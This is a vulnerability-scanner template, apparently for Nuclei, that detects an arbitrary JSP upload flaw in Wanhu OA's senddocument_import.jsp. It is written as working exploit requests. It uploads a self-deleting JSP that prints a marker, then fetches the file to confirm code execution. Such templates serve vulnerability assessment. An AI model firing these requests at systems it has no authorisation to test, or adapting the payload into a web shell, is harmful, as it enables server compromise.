id: poc-yaml-wan-hu-oa-senddocument-import-jsp-anyfile-upload
info:
  name: Wanhu OA Arbitrary File Upload Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  tags: file-upload,arbitrary-upload

variables:
  random_str: "{{rand_base(4)}}"
  encoded_str: "{{base64(random_str)}}"

http:
  - id: upload-file
    method: POST
    path:
      - "{{BaseURL}}/defaultroot/modules/govoffice/gov_documentmanager/senddocument_import.jsp;?categoryId=null&path=loginpage&mode=add&fileName=null&saveName=null&fileMaxSize=0&fileMaxNum=null&fileType=jsp"
    headers:
      Content-Type: multipart/form-data; boundary=----dzod41f2gyretapdhvzi
    body: |-
      ------dzod41f2gyretapdhvzi
      Content-Disposition: form-data; name="photo"; filename="{{random_str}}.jsp"
      Content-Type: application/octet-stream

      <%out.println("{{encoded_str}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
      ------dzod41f2gyretapdhvzi
      Content-Disposition: form-data; name="continueUpload"

      0
      ------dzod41f2gyretapdhvzi
      Content-Disposition: form-data; name="submit"

      导 入
      ------dzod41f2gyretapdhvzi--
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "saveName="
          - "导入"
      - type: status
        status:
          - 200
    extractors:
      - type: regex
        internal: true
        name: save_name
        group: 1
        regex:
          - 'saveName="(\d+)'

  - id: verify-upload
    method: GET
    path:
      - "{{BaseURL}}/defaultroot/upload/loginpage/{{save_name}}.jsp"
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "{{encoded_str}}"
      - type: status
        status:
          - 200
